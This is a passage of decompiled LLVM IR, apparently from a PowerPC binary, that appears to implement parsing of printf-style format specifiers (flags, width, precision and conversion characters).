  %v2_10004288 = icmp sgt i32 %v0_100042d0, 4094
  br i1 %v2_10004288, label %dec_label_pc_10004280, label %dec_label_pc_1000427c

dec_label_pc_1000427c:                            ; preds = %dec_label_pc_10004278
  %v1_1000427c = add i32 %v2_1000429c, -48
  store i32 %v1_1000427c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10004280

dec_label_pc_10004280:                            ; preds = %dec_label_pc_10004278, %dec_label_pc_1000427c
  %v0_1000428815 = phi i32 [ %v0_100042d0, %dec_label_pc_10004278 ], [ %v1_1000427c, %dec_label_pc_1000427c ]
  %v1_10004280 = add i32 %v0_10004300, 1
  store i32 %v1_10004280, i32* @r30, align 4
  br label %dec_label_pc_10004284

dec_label_pc_10004284:                            ; preds = %dec_label_pc_1000426c, %dec_label_pc_10004280
  %v0_100042d0 = phi i32 [ 0, %dec_label_pc_1000426c ], [ %v0_1000428815, %dec_label_pc_10004280 ]
  %v0_10004300 = phi i32 [ %v0_10004284.pre, %dec_label_pc_1000426c ], [ %v1_10004280, %dec_label_pc_10004280 ]
  %v1_10004284 = inttoptr i32 %v0_10004300 to i8*
  %v2_10004284 = load i8, i8* %v1_10004284, align 1
  %v3_10004284 = zext i8 %v2_10004284 to i32
  store i32 %v3_10004284, i32* %r11.global-to-local, align 4
  %v1_1000428c = mul nuw nsw i32 %v3_10004284, 2
  store i32 %v1_1000428c, i32* %r9.global-to-local, align 4
  %v2_10004290 = add i32 %v1_1000428c, %v3_1000426c
  %v3_10004290 = inttoptr i32 %v2_10004290 to i16*
  %v4_10004290 = load i16, i16* %v3_10004290, align 2
  %v5_10004290 = zext i16 %v4_10004290 to i32
  store i32 %v5_10004290, i32* %r0.global-to-local, align 4
  %v1_10004294 = mul i32 %v0_100042d0, 10
  %v1_10004298 = and i32 %v5_10004290, 8
  store i32 %v1_10004298, i32* @r25, align 4
  %v3_10004298 = icmp eq i32 %v1_10004298, 0
  %v2_1000429c = add i32 %v3_10004284, %v1_10004294
  store i32 %v2_1000429c, i32* %r9.global-to-local, align 4
  br i1 %v3_10004298, label %dec_label_pc_100042a4, label %dec_label_pc_10004278

dec_label_pc_100042a4:                            ; preds = %dec_label_pc_10004284
  %v0_100042a4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100042a4 = add i32 %v0_100042a4, -1
  %v2_100042a4 = inttoptr i32 %v1_100042a4 to i8*
  %v3_100042a4 = load i8, i8* %v2_100042a4, align 1
  %v4_100042a4 = zext i8 %v3_100042a4 to i32
  store i32 %v4_100042a4, i32* %r0.global-to-local, align 4
  %v3_100042a8 = icmp eq i8 %v3_100042a4, 37
  br i1 %v3_100042a8, label %dec_label_pc_100042b0, label %dec_label_pc_10004378

dec_label_pc_100042b0:                            ; preds = %dec_label_pc_100042a4
  %v3_100042b0 = icmp eq i8 %v2_10004284, 36
  br i1 %v3_100042b0, label %dec_label_pc_100042b8, label %dec_label_pc_100042ec

dec_label_pc_100042b8:                            ; preds = %dec_label_pc_100042b0
  %tmp58 = icmp slt i32 %v0_100042d0, 1
  br i1 %tmp58, label %dec_label_pc_100042ec, label %dec_label_pc_100042c0

dec_label_pc_100042c0:                            ; preds = %dec_label_pc_100042b8
  %v0_100042c0 = load i32, i32* @r26, align 4
  %v3_100042c0 = icmp eq i32 %v0_100042c0, 0
  %v1_100042c4 = add i32 %v0_10004300, 1
  store i32 %v1_100042c4, i32* %r10.global-to-local, align 4
  br i1 %v3_100042c0, label %dec_label_pc_10004688, label %dec_label_pc_100042cc

dec_label_pc_100042cc:                            ; preds = %dec_label_pc_100042c0
  %v3_100042cc = icmp sgt i32 %v0_100042d0, %v0_100042c0
  br i1 %v3_100042cc, label %dec_label_pc_100042d8, label %dec_label_pc_100042e4

dec_label_pc_100042d8:                            ; preds = %dec_label_pc_100042cc
  store i32 %v0_100042d0, i32* @r26, align 4
  br label %dec_label_pc_100042e4

dec_label_pc_100042e0:                            ; preds = %dec_label_pc_10004308, %dec_label_pc_10004300
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_100042e4

dec_label_pc_100042e4:                            ; preds = %dec_label_pc_100042cc, %dec_label_pc_100042d8, %dec_label_pc_100042e0
  %v0_100042e4 = phi i32 [ %v0_100042a4, %dec_label_pc_100042e0 ], [ %v1_100042c4, %dec_label_pc_100042d8 ], [ %v1_100042c4, %dec_label_pc_100042cc ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_100042e0 ], [ %v0_100042d0, %dec_label_pc_100042d8 ], [ %v0_100042d0, %dec_label_pc_100042cc ]
  br label %dec_label_pc_10004320

dec_label_pc_100042ec:                            ; preds = %dec_label_pc_100042b0, %dec_label_pc_100042b8
  %v0_100042ec = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_100042ec, 1
  br i1 %tmp59, label %dec_label_pc_10004300, label %dec_label_pc_100042f4

dec_label_pc_100042f4:                            ; preds = %dec_label_pc_100042ec
  %v3_100042f4 = icmp eq i8 %v2_10004284, 109
  br i1 %v3_100042f4, label %dec_label_pc_10004378, label %dec_label_pc_10004688

dec_label_pc_10004300:                            ; preds = %dec_label_pc_100042ec
  %v3_10004300 = icmp ugt i32 %v0_10004300, %v0_100042a4
  br i1 %v3_10004300, label %dec_label_pc_10004308, label %dec_label_pc_100042e0

dec_label_pc_10004308:                            ; preds = %dec_label_pc_10004300
  %v1_10004308 = inttoptr i32 %v0_100042a4 to i8*
  %v2_10004308 = load i8, i8* %v1_10004308, align 1
  %v3_10004308 = zext i8 %v2_10004308 to i32
  store i32 %v3_10004308, i32* %r0.global-to-local, align 4
  store i32 %v0_100042a4, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_10004314 = icmp eq i8 %v2_10004308, 48
  br i1 %v3_10004314, label %dec_label_pc_100042e0, label %dec_label_pc_1000437c

dec_label_pc_10004320:                            ; preds = %dec_label_pc_1000433c, %dec_label_pc_100042e4
  %v0_10004340 = phi i32 [ %v0_100042e4, %dec_label_pc_100042e4 ], [ %v1_10004340, %dec_label_pc_1000433c ]
  store i32 %v0_10004340, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1000bd3c.366 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10004330 = inttoptr i32 %v0_10004340 to i8*
  br label %dec_label_pc_10004328

dec_label_pc_10004328:                            ; preds = %dec_label_pc_10004348, %dec_label_pc_10004320
  %v1_1000433c = phi i32 [ %v1_1000434c, %dec_label_pc_10004348 ], [ 1, %dec_label_pc_10004320 ]
  %v0_10004328 = phi i32 [ %v1_1000432c, %dec_label_pc_10004348 ], [ ptrtoint ([8 x i8]* @global_var_1000bd3c.366 to i32), %dec_label_pc_10004320 ]
  %v1_10004328 = inttoptr i32 %v0_10004328 to i8*
  %v2_10004328 = load i8, i8* %v1_10004328, align 1
  %v3_10004328 = zext i8 %v2_10004328 to i32
  store i32 %v3_10004328, i32* %r9.global-to-local, align 4
  %v1_1000432c = add i32 %v0_10004328, 1
  store i32 %v1_1000432c, i32* %r11.global-to-local, align 4
  %v2_10004330 = load i8, i8* %v1_10004330, align 1
  %v3_10004330 = zext i8 %v2_10004330 to i32
  store i32 %v3_10004330, i32* %r0.global-to-local, align 4
  %v4_10004334 = icmp eq i8 %v2_10004330, %v2_10004328
  br i1 %v4_10004334, label %dec_label_pc_1000433c, label %dec_label_pc_10004348

dec_label_pc_1000433c:                            ; preds = %dec_label_pc_10004328
  %v0_1000433c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000433c = or i32 %v0_1000433c, %v1_1000433c
  store i32 %v2_1000433c, i32* %r6.global-to-local, align 4
  %v1_10004340 = add i32 %v0_10004340, 1
  br label %dec_label_pc_10004320

dec_label_pc_10004348:                            ; preds = %dec_label_pc_10004328
  %v1_10004348 = inttoptr i32 %v1_1000432c to i8*
  %v2_10004348 = load i8, i8* %v1_10004348, align 1
  %v3_10004348 = zext i8 %v2_10004348 to i32
  store i32 %v3_10004348, i32* %r0.global-to-local, align 4
  %v1_1000434c = mul i32 %v1_1000433c, 2
  store i32 %v1_1000434c, i32* %r10.global-to-local, align 4
  %v3_10004350 = icmp eq i8 %v2_10004348, 0
  br i1 %v3_10004350, label %dec_label_pc_10004358, label %dec_label_pc_10004328

dec_label_pc_10004358:                            ; preds = %dec_label_pc_10004348
  %v1_10004358 = add i32 %v0_10004340, -1
  %v2_10004358 = inttoptr i32 %v1_10004358 to i8*
  %v3_10004358 = load i8, i8* %v2_10004358, align 1
  %v4_10004358 = zext i8 %v3_10004358 to i32
  store i32 %v4_10004358, i32* %r0.global-to-local, align 4
  %v0_1000435c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000435c = and i32 %v0_1000435c, 10
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_10004364 = icmp eq i8 %v3_10004358, 37
  %v1_10004368 = udiv i32 %v1_1000435c, 2
  store i32 %v1_10004368, i32* %r9.global-to-local, align 4
  %v2_1000436c = sub nuw nsw i32 -1, %v1_10004368
  %v3_1000436c = and i32 %v0_1000435c, %v2_1000436c
  store i32 %v3_1000436c, i32* %r6.global-to-local, align 4
  br i1 %v3_10004364, label %dec_label_pc_1000437c, label %dec_label_pc_10004248

dec_label_pc_10004378:                            ; preds = %dec_label_pc_100042a4, %dec_label_pc_100042f4
  store i32 %v0_100042a4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000437c

dec_label_pc_1000437c:                            ; preds = %dec_label_pc_10004308, %dec_label_pc_10004358, %dec_label_pc_10004378
  %v0_100043b0 = phi i32 [ 0, %dec_label_pc_10004358 ], [ %v0_100042d0, %dec_label_pc_10004308 ], [ %v0_100042d0, %dec_label_pc_10004378 ]
  %v1_100043bc = phi i32 [ %v0_10004340, %dec_label_pc_10004358 ], [ %v0_10004300, %dec_label_pc_10004308 ], [ %v0_10004300, %dec_label_pc_10004378 ]
  %v0_100043b8 = phi i32 [ %v1_1000432c, %dec_label_pc_10004358 ], [ %v0_100042a4, %dec_label_pc_10004308 ], [ %v0_100042a4, %dec_label_pc_10004378 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_10004358 ], [ %stack_var_-84.1, %dec_label_pc_10004308 ], [ %stack_var_-84.1, %dec_label_pc_10004378 ]
  %v1_1000437c = inttoptr i32 %v0_100043b8 to i8*
  %v2_1000437c = load i8, i8* %v1_1000437c, align 1
  %v3_1000437c = zext i8 %v2_1000437c to i32
  store i32 %v3_1000437c, i32* %r0.global-to-local, align 4
  %v3_10004380 = icmp eq i8 %v2_1000437c, 42
  br i1 %v3_10004380, label %dec_label_pc_10004388, label %dec_label_pc_100043c8

dec_label_pc_10004388:                            ; preds = %dec_label_pc_1000437c
  %v0_10004388 = load i32, i32* @r26, align 4
  %v3_10004388 = icmp eq i32 %v0_10004388, 0
  br i1 %v3_10004388, label %dec_label_pc_100043b8, label %dec_label_pc_10004390

dec_label_pc_10004390:                            ; preds = %dec_label_pc_10004388
  %v1_10004390 = inttoptr i32 %v1_100043bc to i8*
  %v2_10004390 = load i8, i8* %v1_10004390, align 1
  %v3_10004390 = zext i8 %v2_10004390 to i32
  store i32 %v3_10004390, i32* %r0.global-to-local, align 4
  %v3_10004394 = icmp eq i8 %v2_10004390, 36
  br i1 %v3_10004394, label %dec_label_pc_1000439c, label %dec_label_pc_10004688

dec_label_pc_1000439c:                            ; preds = %dec_label_pc_10004390
  %tmp60 = icmp slt i32 %v0_100043b0, 1
  br i1 %tmp60, label %dec_label_pc_10004688, label %dec_label_pc_100043a4

dec_label_pc_100043a4:                            ; preds = %dec_label_pc_1000439c
  %v0_100043a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100043a4 = mul i32 %v0_100043a4, -4
  %v1_100043a8 = add i32 %v1_100043bc, 1
  store i32 %v1_100043a8, i32* @r30, align 4
  %v0_100043ac = load i32, i32* %r3.global-to-local, align 4
  %v2_100043ac = add i32 %v0_100043ac, %v1_100043a4
  store i32 %v2_100043ac, i32* %r9.global-to-local, align 4
  %v2_100043b0 = add i32 %v2_100043ac, 12
  %v3_100043b0 = inttoptr i32 %v2_100043b0 to i32*
  store i32 %v0_100043b0, i32* %v3_100043b0, align 4
  %v0_100043d0.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100043c4

dec_label_pc_100043b8:                            ; preds = %dec_label_pc_10004388
  %v1_100043b8 = add i32 %v0_100043b8, 1
  store i32 %v1_100043b8, i32* %r0.global-to-local, align 4
  %v4_100043bc = icmp eq i32 %v1_100043b8, %v1_100043bc
  br i1 %v4_100043bc, label %dec_label_pc_100043c4, label %dec_label_pc_10004688

dec_label_pc_100043c4:                            ; preds = %dec_label_pc_100043b8, %dec_label_pc_100043a4
  %v0_100043d0.pre = phi i32 [ %v1_100043bc, %dec_label_pc_100043b8 ], [ %v0_100043d0.pre.pre, %dec_label_pc_100043a4 ]
  store i32 -2147483648, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100043c8

dec_label_pc_100043c8:                            ; preds = %dec_label_pc_1000437c, %dec_label_pc_100043c4
  %v0_100043d0 = phi i32 [ %v1_100043bc, %dec_label_pc_1000437c ], [ %v0_100043d0.pre, %dec_label_pc_100043c4 ]
  %v0_100043e0 = phi i32 [ %v0_100043b0, %dec_label_pc_1000437c ], [ -2147483648, %dec_label_pc_100043c4 ]
  %v0_100043c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_100043c8 = icmp eq i32 %v0_100043c8, 0
  %v1_100043d0 = inttoptr i32 %v0_100043d0 to i8*
  br i1 %v3_100043c8, label %dec_label_pc_100043d0, label %dec_label_pc_100043f4

dec_label_pc_100043d0:                            ; preds = %dec_label_pc_100043c8
  %v2_100043d0 = load i8, i8* %v1_100043d0, align 1
  %v3_100043d0 = zext i8 %v2_100043d0 to i32
  store i32 %v3_100043d0, i32* %r0.global-to-local, align 4
  %v3_100043d4 = icmp eq i8 %v2_100043d0, 46
  br i1 %v3_100043d4, label %dec_label_pc_100043dc, label %dec_label_pc_100043ec

dec_label_pc_100043dc:                            ; preds = %dec_label_pc_100043d0
  %v1_100043dc = add i32 %v0_100043d0, 1
  store i32 %v0_100043e0, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10004248

dec_label_pc_100043ec:                            ; preds = %dec_label_pc_100043d0
  store i32 %v0_100043e0, i32* @r31, align 4
  br label %dec_label_pc_100043f4

dec_label_pc_100043f4:                            ; preds = %dec_label_pc_100043c8, %dec_label_pc_100043ec
  %storemerge1 = phi i32 [ -1, %dec_label_pc_100043ec ], [ %v0_100043e0, %dec_label_pc_100043c8 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_100043f8 = load i8, i8* %v1_100043d0, align 1
  %v3_100043f8 = zext i8 %v2_100043f8 to i32
  store i32 %v3_100043f8, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1000bce4.367 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004400

dec_label_pc_10004400:                            ; preds = %dec_label_pc_1000440c, %dec_label_pc_100043f4
  %v0_1000440c = phi i32 [ %v1_1000440c, %dec_label_pc_1000440c ], [ ptrtoint ([9 x i8]* @global_var_1000bce4.367 to i32), %dec_label_pc_100043f4 ]
  %v1_10004400 = inttoptr i32 %v0_1000440c to i8*
  %v2_10004400 = load i8, i8* %v1_10004400, align 1
  %v3_10004400 = zext i8 %v2_10004400 to i32
  store i32 %v3_10004400, i32* %r0.global-to-local, align 4
  %v4_10004404 = icmp eq i8 %v2_100043f8, %v2_10004400
  br i1 %v4_10004404, label %dec_label_pc_100041d0, label %dec_label_pc_1000440c

dec_label_pc_1000440c:                            ; preds = %dec_label_pc_10004400
  %v1_1000440c = add i32 %v0_1000440c, 1
  %v2_1000440c = inttoptr i32 %v1_1000440c to i8*
  %v3_1000440c = load i8, i8* %v2_1000440c, align 1
  %v4_1000440c = zext i8 %v3_1000440c to i32
  store i32 %v4_1000440c, i32* %r0.global-to-local, align 4
  store i32 %v1_1000440c, i32* %r11.global-to-local, align 4
  %v3_10004410 = icmp eq i8 %v3_1000440c, 0
  br i1 %v3_10004410, label %dec_label_pc_10004418, label %dec_label_pc_10004400

dec_label_pc_10004418:                            ; preds = %dec_label_pc_1000440c, %dec_label_pc_100041d0
  %v0_10004440 = phi i32 [ %v1_100041d0, %dec_label_pc_100041d0 ], [ %v0_100043d0, %dec_label_pc_1000440c ]
  %v0_1000443c = phi i32 [ %v0_1000440c, %dec_label_pc_100041d0 ], [ %v1_1000440c, %dec_label_pc_1000440c ]
  %v2_10004420 = sub i32 %v0_1000443c, ptrtoint ([9 x i8]* @global_var_1000bce4.367 to i32)
  store i32 %v2_10004420, i32* %r9.global-to-local, align 4
  %v2_10004424 = icmp sgt i32 %v2_10004420, 1
  br i1 %v2_10004424, label %dec_label_pc_10004444, label %dec_label_pc_1000442c

dec_label_pc_1000442c:                            ; preds = %dec_label_pc_10004418
  %v1_1000442c = inttoptr i32 %v0_10004440 to i8*
  %v2_1000442c = load i8, i8* %v1_1000442c, align 1
  %v3_1000442c = zext i8 %v2_1000442c to i32
  store i32 %v3_1000442c, i32* %r0.global-to-local, align 4
  %v1_10004430 = inttoptr i32 %v0_1000443c to i8*
  %v2_10004430 = load i8, i8* %v1_10004430, align 1
  %v3_10004430 = zext i8 %v2_10004430 to i32
  store i32 %v3_10004430, i32* %r9.global-to-local, align 4
  %v4_10004434 = icmp eq i8 %v2_1000442c, %v2_10004430
  br i1 %v4_10004434, label %dec_label_pc_1000443c, label %dec_label_pc_10004444

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_1000442c
  %v1_1000443c = add i32 %v0_1000443c, 9
  store i32 %v1_1000443c, i32* %r11.global-to-local, align 4
  %v1_10004440 = add i32 %v0_10004440, 1
  store i32 %v1_10004440, i32* @r30, align 4
  br label %dec_label_pc_10004444

dec_label_pc_10004444:                            ; preds = %dec_label_pc_1000442c, %dec_label_pc_10004418, %dec_label_pc_1000443c
  %v0_10004448 = phi i32 [ %v0_1000443c, %dec_label_pc_1000442c ], [ %v0_1000443c, %dec_label_pc_10004418 ], [ %v1_1000443c, %dec_label_pc_1000443c ]
  %v0_10004444 = phi i32 [ %v0_10004440, %dec_label_pc_1000442c ], [ %v0_10004440, %dec_label_pc_10004418 ], [ %v1_10004440, %dec_label_pc_1000443c ]
  %v1_10004444 = inttoptr i32 %v0_10004444 to i8*
  %v2_10004444 = load i8, i8* %v1_10004444, align 1
  %v3_10004444 = zext i8 %v2_10004444 to i32
  store i32 %v3_10004444, i32* @r7, align 4
  %v1_10004448 = add i32 %v0_10004448, 9
  %v2_10004448 = inttoptr i32 %v1_10004448 to i8*
  %v3_10004448 = load i8, i8* %v2_10004448, align 1
  %v4_10004448 = zext i8 %v3_10004448 to i32
  store i32 %v4_10004448, i32* %r0.global-to-local, align 4
  %v3_1000444c = icmp eq i8 %v2_10004444, 0
  %v1_10004450 = mul nuw nsw i32 %v4_10004448, 256
  store i32 %v1_10004450, i32* %r10.global-to-local, align 4
  br i1 %v3_1000444c, label %dec_label_pc_10004688, label %dec_label_pc_10004458

dec_label_pc_10004458:                            ; preds = %dec_label_pc_10004444
  %v1_1000445c = and i32 %v1_10004450, 1024
  store i32 %v1_1000445c, i32* %r0.global-to-local, align 4
  %v3_1000445c = icmp eq i32 %v1_1000445c, 0
  store i32 ptrtoint ([21 x i8]* @global_var_1000bd24.368 to i32), i32* %r8.global-to-local, align 4
  store i32 268500992, i32* %r3.global-to-local, align 4
  %v3_10004468 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_10004468, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000bd18.369 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000bd24.368 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10004478

dec_label_pc_10004478:                            ; preds = %dec_label_pc_100044dc, %dec_label_pc_10004458
  %v1_10004484 = phi i32 [ %v1_100044dc, %dec_label_pc_100044dc ], [ ptrtoint ([21 x i8]* @global_var_1000bd24.368 to i32), %dec_label_pc_10004458 ]
  %v1_10004478 = inttoptr i32 %v1_10004484 to i8*
  %v2_10004478 = load i8, i8* %v1_10004478, align 1
  %v3_10004478 = zext i8 %v2_10004478 to i32
  store i32 %v3_10004478, i32* %r0.global-to-local, align 4
  %v4_1000447c = icmp eq i8 %v2_10004478, %v2_10004444
  br i1 %v4_1000447c, label %dec_label_pc_10004484, label %dec_label_pc_100044dc

dec_label_pc_10004484:                            ; preds = %dec_label_pc_10004478
  %v2_10004484 = sub i32 %v1_10004484, ptrtoint ([21 x i8]* @global_var_1000bd24.368 to i32)
  %tmp61 = icmp slt i32 %v2_10004484, 18
  %brmerge = or i1 %v3_1000445c, %tmp61
  br i1 %brmerge, label %dec_label_pc_10004498, label %dec_label_pc_10004494

dec_label_pc_10004494:                            ; preds = %dec_label_pc_10004484
  %v1_10004494 = add i32 %v2_10004484, -2
  br label %dec_label_pc_10004498

dec_label_pc_10004498:                            ; preds = %dec_label_pc_10004484, %dec_label_pc_10004494
  %storemerge = phi i32 [ %v1_10004494, %dec_label_pc_10004494 ], [ %v2_10004484, %dec_label_pc_10004484 ]
  %v0_10004498 = phi i32 [ %v1_10004494, %dec_label_pc_10004494 ], [ %v2_10004484, %dec_label_pc_10004484 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10004498 = load i32, i32* @r28, align 4
  %v2_10004498 = add i32 %v1_10004498, 32
  %v3_10004498 = inttoptr i32 %v2_10004498 to i32*
  store i32 %v0_10004498, i32* %v3_10004498, align 4
  store i32 ptrtoint (i32* @global_var_1000bd17.370 to i32), i32* %r11.global-to-local, align 4
  %v0_100044a4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100044a0

dec_label_pc_100044a0:                            ; preds = %dec_label_pc_100044a0, %dec_label_pc_10004498
  %v0_100044a0 = phi i32 [ %v1_100044a0, %dec_label_pc_100044a0 ], [ ptrtoint (i32* @global_var_1000bd17.370 to i32), %dec_label_pc_10004498 ]
  %v1_100044a0 = add i32 %v0_100044a0, 1
  %v2_100044a0 = inttoptr i32 %v1_100044a0 to i8*
  %v3_100044a0 = load i8, i8* %v2_100044a0, align 1
  %v4_100044a0 = zext i8 %v3_100044a0 to i32
  store i32 %v4_100044a0, i32* %r0.global-to-local, align 4
  store i32 %v1_100044a0, i32* %r11.global-to-local, align 4
  %v3_100044a4 = icmp sgt i32 %v0_100044a4.pre, %v4_100044a0
  br i1 %v3_100044a4, label %dec_label_pc_100044a0, label %dec_label_pc_100044ac

dec_label_pc_100044ac:                            ; preds = %dec_label_pc_100044a0
  %v0_100044ac = load i32, i32* %r5.global-to-local, align 4
  %v2_100044ac = sub i32 %v1_100044a0, %v0_100044ac
  %v1_100044b4 = mul i32 %v2_100044ac, 2
  store i32 %v1_100044b4, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000bd08.371 to i32), i32* %r9.global-to-local, align 4
  %v2_100044bc = add i32 %v1_100044b4, ptrtoint (i32* @global_var_1000bd08.371 to i32)
  %v3_100044bc = inttoptr i32 %v2_100044bc to i16*
  %v4_100044bc = load i16, i16* %v3_100044bc, align 2
  %v5_100044bc = sext i16 %v4_100044bc to i32
  store i32 %v5_100044bc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000bcf8.372 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1000bd24.368 to i32), i32* %r8.global-to-local, align 4
  %v2_100044cc = add i32 %v1_100044b4, ptrtoint (i32* @global_var_1000bcf8.372 to i32)
  %v3_100044cc = inttoptr i32 %v2_100044cc to i16*
  %v4_100044cc = load i16, i16* %v3_100044cc, align 2
  %v5_100044cc = sext i16 %v4_100044cc to i32
  store i32 %v5_100044cc, i32* %r9.global-to-local, align 4
  %v2_100044d0 = or i32 %v5_100044bc, %v1_10004450
  store i32 %v2_100044d0, i32* %r0.global-to-local, align 4
  %v2_100044d4 = and i32 %v5_100044cc, %v2_100044d0
  store i32 %v2_100044d4, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100044e8

dec_label_pc_100044dc:                            ; preds = %dec_label_pc_10004478
  %v1_100044dc = add i32 %v1_10004484, 1
  %v2_100044dc = inttoptr i32 %v1_100044dc to i8*
  %v3_100044dc = load i8, i8* %v2_100044dc, align 1
  %v4_100044dc = zext i8 %v3_100044dc to i32
  store i32 %v4_100044dc, i32* %r0.global-to-local, align 4
  store i32 %v1_100044dc, i32* %r8.global-to-local, align 4
  %v3_100044e0 = icmp eq i8 %v3_100044dc, 0
  br i1 %v3_100044e0, label %dec_label_pc_100044e8, label %dec_label_pc_10004478

dec_label_pc_100044e8:                            ; preds = %dec_label_pc_100044dc, %dec_label_pc_100044ac
  %v0_100044e8 = phi i32 [ %v2_100044d4, %dec_label_pc_100044ac ], [ %v3_10004468, %dec_label_pc_100044dc ]
  store i32 %v0_100044e8, i32* %stack_var_-96, align 4
  %v0_100044ec = load i32, i32* %r6.global-to-local, align 4
  %v1_100044ec = call i32 @__asm_rlwinm(i32 %v0_100044ec, i32 30, i32 31, i32 31)
  %not.v2_100044f0 = icmp eq i32 %v1_100044ec, 0
  %v6_100044f4 = sext i1 %not.v2_100044f0 to i32
  store i32 %v6_100044f4, i32* %r9.global-to-local, align 4
  %v1_100044f8 = call i32 @__asm_rlwinm(i32 %v1_10004450, i32 0, i32 20, i32 23)
  store i32 %v1_100044f8, i32* %r0.global-to-local, align 4
  %v1_100044fc = call i32 @__asm_rlwinm(i32 %v6_100044f4, i32 0, i32 0, i32 27)
  store i32 %v1_100044fc, i32* %r9.global-to-local, align 4
  %v0_10004500 = load i32, i32* @r30, align 4
  %v1_10004500 = inttoptr i32 %v0_10004500 to i8*
  %v2_10004500 = load i8, i8* %v1_10004500, align 1
  %v3_10004500 = zext i8 %v2_10004500 to i32
  store i32 %v3_10004500, i32* %r10.global-to-local, align 4
  %v0_10004504 = load i32, i32* %r6.global-to-local, align 4
  %v1_10004504 = call i32 @__asm_rlwinm(i32 %v0_10004504, i32 0, i32 30, i32 28)
  %v1_10004508 = add i32 %v1_100044fc, 48
  store i32 %v1_10004508, i32* %r9.global-to-local, align 4
  %v2_1000450c = or i32 %v1_10004504, %v1_100044f8
  store i32 %v2_1000450c, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_10004514 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004514 = load i32, i32* @r28, align 4
  %v2_10004514 = add i32 %v1_10004514, 12
  %v3_10004514 = inttoptr i32 %v2_10004514 to i32*
  store i32 %v0_10004514, i32* %v3_10004514, align 4
  %v0_10004518 = load i32, i32* %r4.global-to-local, align 4
  %v1_10004518 = load i32, i32* @r28, align 4
  %v2_10004518 = add i32 %v1_10004518, 4
  %v3_10004518 = inttoptr i32 %v2_10004518 to i32*
  store i32 %v0_10004518, i32* %v3_10004518, align 4
  %v0_1000451c = load i32, i32* @r31, align 4
  %v1_1000451c = load i32, i32* @r28, align 4
  %v2_1000451c = add i32 %v1_1000451c, 8
  %v3_1000451c = inttoptr i32 %v2_1000451c to i32*
  store i32 %v0_1000451c, i32* %v3_1000451c, align 4
  %v0_10004520 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004520 = load i32, i32* @r28, align 4
  %v2_10004520 = add i32 %v1_10004520, 20
  %v3_10004520 = inttoptr i32 %v2_10004520 to i32*
  store i32 %v0_10004520, i32* %v3_10004520, align 4
  %v0_10004524 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004524 = load i32, i32* @r28, align 4
  %v2_10004524 = add i32 %v1_10004524, 16
  %v3_10004524 = inttoptr i32 %v2_10004524 to i32*
  store i32 %v0_10004524, i32* %v3_10004524, align 4
  %v0_10004528 = load i32, i32* @r7, align 4
  %v1_10004528 = load i32, i32* @r28, align 4
  %v2_10004528 = add i32 %v1_10004528, 28
  %v3_10004528 = inttoptr i32 %v2_10004528 to i32*
  store i32 %v0_10004528, i32* %v3_10004528, align 4
  %v0_1000452c = load i32, i32* %r8.global-to-local, align 4
  %v1_1000452c = inttoptr i32 %v0_1000452c to i8*
  %v2_1000452c = load i8, i8* %v1_1000452c, align 1
  %v3_1000452c = zext i8 %v2_1000452c to i32
  store i32 %v3_1000452c, i32* %r9.global-to-local, align 4
  %v3_10004530 = icmp eq i8 %v2_1000452c, 0
  br i1 %v3_10004530, label %dec_label_pc_10004538, label %dec_label_pc_10004550

dec_label_pc_10004538:                            ; preds = %dec_label_pc_100044e8
  %v0_10004538 = load i32, i32* @r30, align 4
  %v1_10004538 = inttoptr i32 %v0_10004538 to i8*
  %v2_10004538 = load i8, i8* %v1_10004538, align 1
  %v3_10004538 = zext i8 %v2_10004538 to i32
  store i32 %v3_10004538, i32* %r0.global-to-local, align 4
  %v3_1000453c = icmp eq i8 %v2_10004538, 109
  br i1 %v3_1000453c, label %dec_label_pc_10004544, label %dec_label_pc_10004688

dec_label_pc_10004544:                            ; preds = %dec_label_pc_10004538
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10004548 = load i32, i32* @r28, align 4
  %v2_10004548 = add i32 %v1_10004548, 28
  %v3_10004548 = inttoptr i32 %v2_10004548 to i32*
  store i32 %v3_1000452c, i32* %v3_10004548, align 4
  %v0_1000454c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000454c = load i32, i32* @r28, align 4
  %v2_1000454c = add i32 %v1_1000454c, 32
  %v3_1000454c = inttoptr i32 %v2_1000454c to i32*
